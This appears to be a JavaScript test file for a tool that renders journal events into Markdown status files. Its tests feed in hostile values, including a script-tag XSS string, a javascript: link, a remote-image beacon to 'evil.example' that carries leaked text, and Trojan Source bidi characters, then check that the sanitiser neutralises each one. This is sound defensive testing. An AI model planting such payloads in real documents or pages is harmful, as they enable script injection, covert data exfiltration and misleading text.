/** Built from code points so no raw control/bidi byte ever enters this file. */
const INVISIBLE = [
  0x0000, 0x0007, 0x001b, 0x007f, 0x0085, 0x009f, // C0, DEL, NEL, C1
  0x200b, 0x200c, 0x200d, 0x200e, 0x200f, // zero-width + direction marks
  0x202a, 0x202b, 0x202c, 0x202d, 0x202e, // bidi embeddings + overrides (RLO)
  0x2066, 0x2067, 0x2068, 0x2069, // bidi isolates
  0xfeff, // BOM / zero-width no-break
].map((c) => String.fromCodePoint(c));
/** Predicate over code points — a literal character class here would put
    the very bytes under test into this file. Newline is legal in a doc. */
const isInvisible = (cp) =>
  cp < 0x20 ||
  (cp >= 0x7f && cp <= 0x9f) ||
  (cp >= 0x200b && cp <= 0x200f) ||
  (cp >= 0x202a && cp <= 0x202e) ||
  (cp >= 0x2066 && cp <= 0x2069) ||
  cp === 0xfeff;
const hasInvisible = (s) => [...s].some((c) => c !== '\n' && isInvisible(c.codePointAt(0)));

test('hostile journal data cannot break tables, the header, or inject HTML', () => {
  const nasty = 'a | b\nrow2 | c `code` <script>alert(1)</script> --> & \\pipe';
  const { files } = renderProjections({
    events: [ev({ ev: 'ticket.created', data: { id: 'T-1', title: nasty } })],
  });
  const state = files[STATE_FILE];
  const row = state.split('\n').find((l) => l.startsWith('| `T-1`'));
  assert.equal(row.split('|').length - 2, 6); // exactly the 6 declared columns
  assert.ok(!state.includes('<script>'));
  assert.ok(!row.includes('\n'));
  // No journal value can ever emit a raw `<`, `>` or `|` — so it can neither
  // inject HTML nor close/forge the GENERATED comment.
  const body = state.slice(state.indexOf('\n# STATE'));
  assert.ok(!/[<>]/.test(body), 'raw angle bracket leaked into the document body');
  assert.equal((state.match(/<!--/g) ?? []).length, 2);
  assert.equal((state.match(/-->/g) ?? []).length, 2);
  assert.equal(
    state.split('\n')[0],
    '<!-- GENERATED by tyran scripts/project.mjs - DO NOT EDIT. Source of truth: journal.jsonl -->',
  );
});

test('a journal value cannot render as a Markdown link or remote image', () => {
  // An <img src> to a foreign host is a read beacon plus an exfiltration
  // channel: the URL can carry up to MAX_CELL characters of journal text.
  const beacon = '![x](https://evil.example/track.png?j=leak) [click](javascript:alert(1))';
  const { files } = renderProjections({
    events: [
      ev({ ev: 'ticket.created', data: { id: 'T-1', title: beacon } }),
      ev({ ev: 'decision', data: { id: 'D-1', text: beacon } }),
      ev({ data: { phase: beacon, next_steps: [beacon] } }),
    ],
  });
  assert.ok(!/[[\]]/.test(files[STATE_FILE]), 'bracket survived into STATE.md');
  // PROGRESS.md legitimately contains generator-made checkboxes `- [ ]`/`- [x]`
  const progressWithoutCheckboxes = files[PROGRESS_FILE].replace(/^- \[[ x]\] /gm, '- ');
  assert.ok(!/[[\]]/.test(progressWithoutCheckboxes), 'bracket survived into PROGRESS.md');
  assert.ok(files[STATE_FILE].includes('&#91;') && files[STATE_FILE].includes('&#93;'));
  assert.ok(!files[STATE_FILE].includes('](')); // no link syntax can form
});

test('bidi overrides and zero-width characters never reach the document', () => {
  // An unterminated RLO mirrors every following column: a journal value could
  // rewrite the document the conductor makes decisions from (Trojan Source).
  const trojan = `admin${INVISIBLE.join('')}rotcerid`;
  const { files } = renderProjections({
    events: [
      ev({ ev: 'ticket.created', data: { id: 'T-1', title: trojan } }),
      ev({ ev: 'spawn', data: { agent: trojan, role: trojan, worktree: trojan } }),
      ev({ ev: 'error', data: { class: trojan, detail: trojan } }),
      ev({ data: { phase: trojan, next_steps: [trojan] } }),
    ],
  });
  for (const [name, content] of Object.entries(files)) {
    assert.ok(!hasInvisible(content), `invisible/bidi code point survived into ${name}`);
  }
  // and the visible text is preserved, just neutralized
  assert.ok(files[STATE_FILE].includes('admin'));
});

test('the source files carry NO raw control or bidi bytes, only escape notation', () => {
  // Twice during this story a tool turned six-character escape notation
  // actual byte while writing these files. A raw NUL also makes grep return
  // nothing at all, silently. The defence cannot be author attentiveness.
  for (const path of [SCRIPT, new URL(import.meta.url).pathname]) {
    const src = readFileSync(path, 'utf8');
    const offenders = [...src]
      .map((c, i) => [c, i])
      .filter(([c]) => c !== '\n' && c !== '\t' && isInvisible(c.codePointAt(0)))
      .map(([c, i]) => `U+${c.codePointAt(0).toString(16).padStart(4, '0')} at offset ${i}`);
    assert.deepEqual(offenders, [], `raw invisible bytes in ${path}`);
  }
});

test('inline() SHOWS every listed invisible code point, and deletes none of them', () => {
  // It used to blank them, so a value made only of invisible characters was
  // indistinguishable from an empty one and nothing anywhere said anything had
  // been dropped. ADR-19 correction 1: an exclusion must never be silent.
  for (const ch of INVISIBLE) {
    const point = ch.codePointAt(0);
    const out = inline(`a${ch}b`);
    assert.ok(!hasInvisible(out), `U+${point.toString(16)} survived inline()`);
    const hex = point.toString(16).toUpperCase().padStart(4, '0');
    assert.equal(out, `a&lt;U+${hex}&gt;b`);
  }
});

